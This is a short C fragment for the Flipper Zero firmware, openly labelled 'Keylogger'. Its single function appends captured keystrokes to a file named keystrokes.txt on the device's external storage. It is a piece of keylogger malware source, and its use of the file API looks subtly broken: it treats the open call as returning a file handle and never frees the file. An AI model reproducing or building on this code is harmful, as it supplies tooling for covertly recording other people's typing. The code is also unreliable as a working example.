#include <furi.h>
#include <furi/log.h>
#include <storage/storage.h>

void save_keystroke_to_storage(char character) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_open(storage, "/ext/keystrokes.txt", FSAM_WRITE, FSOM_APPEND);
    if(file) {
        storage_file_write(file, &character, sizeof(character));
        storage_file_write(file, "\n", 1);
        storage_file_close(file);
    } else {
        FURI_LOG_E("Keylogger", "ERROR opening keystrokes.txt");
    }
    furi_record_close(RECORD_STORAGE);
}
